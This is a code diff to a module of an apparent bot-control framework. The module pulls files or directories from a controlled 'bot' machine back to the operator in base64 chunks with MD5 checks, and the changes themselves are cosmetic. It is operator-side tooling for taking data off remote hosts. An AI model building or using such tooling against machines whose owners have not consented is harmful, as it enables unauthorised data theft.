@@ -8,7 +8,7 @@ from Cryptodome.Hash import MD5
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author:": ["Marten4n6"],
             "Description": "Download a file or directory from the bot.",
@@ -16,14 +16,14 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def get_setup_messages(self) -> List[str]:
+    def get_setup_messages(self):
         return [
             "Path to file or directory on the bot's machine: ",
             "Buffer size (Leave empty for 4096 bytes): ",
             "Local output name (Leave empty for <RANDOM>): "
         ]
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         download_file = set_options[0]
         buffer_size = set_options[1]
         output_name = set_options[2]
@@ -49,7 +49,7 @@ class Module(ModuleABC):
                 }
             }
 
-    def process_response(self, response: bytes, response_options: dict):
+    def process_response(self, response, response_options):
         # Files are sent back to us in small pieces (encoded with base64),
         # we simply decode these pieces and write them to the output file.
         output_name = response_options["output_name"]
@@ -61,17 +61,22 @@ class Module(ModuleABC):
             str_response = ""
 
         if "Failed to download" in str_response:
+            self._view.output_separator()
             self._view.output(str_response, "attention")
         elif "Compressing directory" in str_response:
+            self._view.output_separator()
             self._view.output(str_response, "info")
         elif "Stopped" in str_response:
+            self._view.output_separator()
             self._view.output(str_response, "info")
         elif "Started" in str_response:
             md5_hash = str_response.split("|")[1]
 
+            self._view.output_separator()
             self._view.output("Started downloading: \"{}\"...".format(output_name))
             self._view.output("Remote MD5 file hash: {}".format(md5_hash))
         elif "Finished" in str_response:
+            self._view.output_separator()
             self._view.output("Local MD5 file hash (MUST MATCH!): {}".format(self._get_file_hash(output_file)))
             self._view.output("Finished file download, saved to: {}".format(output_file))
         else:
